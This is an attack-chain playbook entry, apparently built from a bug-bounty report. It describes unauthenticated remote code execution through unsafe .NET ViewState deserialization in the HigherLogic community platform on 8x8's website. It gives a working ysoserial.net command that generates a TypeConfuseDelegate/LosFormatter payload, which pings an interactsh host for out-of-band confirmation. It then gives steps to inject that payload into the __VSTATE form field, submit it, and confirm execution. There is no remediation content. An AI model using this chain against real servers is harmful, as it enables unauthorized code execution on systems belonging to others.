---
tags:
  - rce
  - deserialization
  - .net
  - viewstate
  - higherlogic
type: attack_chain
tools:
  - '[[tools/ysoserial.net]]'
  - '[[tools/interactsh]]'
  - '[[tools/base64]]'
  - '[[tools/gzip]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/ysoserial-generate-payload]]'
  - '[[commands/ping-interactsh]]'
verified: false
platforms:
  - Web
  - .NET
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Generate-Malicious-Deserialization-Payload-with-ysoserial]]'
  - '[[procedures/Insert-Payload-into-__VSTATE-Parameter]]'
  - '[[procedures/Submit-Form-to-Trigger-Deserialization]]'
  - '[[procedures/Observe-RCE-Confirmation-via-Interactsh]]'
step_count: 4
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:23:49.143Z'
description: >-
  Exploits unsafe deserialization in the HigherLogic platform integrated into
  8x8's website to achieve remote code execution by crafting and submitting a
  malicious ViewState payload.
skill_level: intermediate
impact_level: high
id: 7c852c21-0750-470d-9962-c83892c32c12
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Exploitation for Client Execution]]'
---
---
id: 123e4567-e89b-12d3-a456-426614174000
name: Remote Code Execution via Unsafe .NET ViewState Deserialization in HigherLogic
type: attack_chain
description: "Exploits unsafe deserialization in the HigherLogic platform integrated into 8x8's website to achieve remote code execution by crafting and submitting a malicious ViewState payload."
verified: false
submitted: false
step_count: 4
created_at: 2023-10-01T00:00:00Z
updated_at: 2023-10-01T00:00:00Z
procedures: [[procedures/Generate-Malicious-Deserialization-Payload-with-ysoserial]], [[procedures/Insert-Payload-into-__VSTATE-Parameter]], [[procedures/Submit-Form-to-Trigger-Deserialization]], [[procedures/Observe-RCE-Confirmation-via-Interactsh]]
techniques: [[Exploit Public-Facing Application]], [[Exploitation for Client Execution]]
tactics: [[Initial Access]], [[Execution]]
tags: rce, deserialization, .net, viewstate, higherlogic
platforms: Web, .NET
tools: [[tools/ysoserial.net]], [[tools/interactsh]], [[tools/base64]], [[tools/gzip]]
---

# Remote Code Execution via Unsafe .NET ViewState Deserialization in HigherLogic

Multi-stage attack chain demonstrating exploitation of unsafe .NET ViewState deserialization in the HigherLogic community platform to achieve remote code execution on the 8x8 website server.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Generate Payload] --> B[Insert into Form]
    B --> C[Submit Form]
    C --> D[Observe RCE]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/ysoserial.net]]
- [[tools/interactsh]]
- [[tools/base64]]
- [[tools/gzip]]

### Target Environment

- Web platform using ASP.NET with HigherLogic integration
- Access to forms on the HigherLogic community pages (e.g., ██.8x8.com)
- No specific ports required beyond standard HTTP/HTTPS (80/443)

### Initial Access Requirements

- Public access to the website (no credentials needed)
- Network access to submit forms and monitor out-of-band interactions
- No prior access needed

## Detailed Attack Procedures

### Step 1: Generate Malicious Payload
procedure: [[procedures/Generate-Malicious-Deserialization-Payload-with-ysoserial]]

**Objective**: Create a serialized gadget chain payload that executes a command upon deserialization.

**Instructions**: Use [[commands/ysoserial-generate-payload]] to craft the payload targeting the TypeConfuseDelegate gadget with LosFormatter:

```bash
ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "ping aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.interactsh.com" -o raw | base64 -d | gzip - | base64 -w0
```

Process the output to compress and encode it for ViewState insertion.

**Expected Output**: A base64-encoded string representing the compressed, serialized payload.

**Success Indicators**:
- Payload generated without errors
- Encoded string is valid base64

### Step 2: Insert Payload into Form
procedure: [[procedures/Insert-Payload-into-__VSTATE-Parameter]]

**Objective**: Modify the form to include the malicious payload in the __VSTATE parameter.

**Instructions**: Locate a form on the HigherLogic platform page and replace the __VSTATE value with the encoded payload from Step 1. Use browser developer tools or a proxy like Burp Suite to edit the POST request.

**Expected Output**: Form data updated with the malicious __VSTATE.

**Success Indicators**:
- Payload successfully inserted into the form parameter
- No immediate errors on form load

### Step 3: Submit Form
procedure: [[procedures/Submit-Form-to-Trigger-Deserialization]]

**Objective**: Trigger the server-side deserialization of the malicious ViewState, leading to RCE.

**Instructions**: Submit the modified form via POST request to the target endpoint on the HigherLogic platform.

**Expected Output**: Server processes the form, deserializing __VSTATE and executing the embedded command.

**Success Indicators**:
- Form submission completes without client-side errors
- No immediate server rejection

### Step 4: Observe RCE Confirmation
procedure: [[procedures/Observe-RCE-Confirmation-via-Interactsh]]

**Objective**: Verify successful RCE through out-of-band DNS interaction.

**Instructions**: Monitor the Interactsh server for incoming DNS requests triggered by the ping command executed on the target server.

**Expected Output**: DNS query to the Interactsh domain observed in the tool's logs.

**Success Indicators**:
- DNS request from target server IP
- Payload command (ping) confirmed executed

## Attack Chain Summary

### Key Achievements

1. Generated a valid .NET deserialization gadget chain using ysoserial.net
2. Injected and triggered RCE via ViewState without authentication
3. Demonstrated arbitrary command execution on the server via out-of-band confirmation

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Exploitation for Client Execution]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

---
*Last updated: 2023-10-01T00:00:00Z*
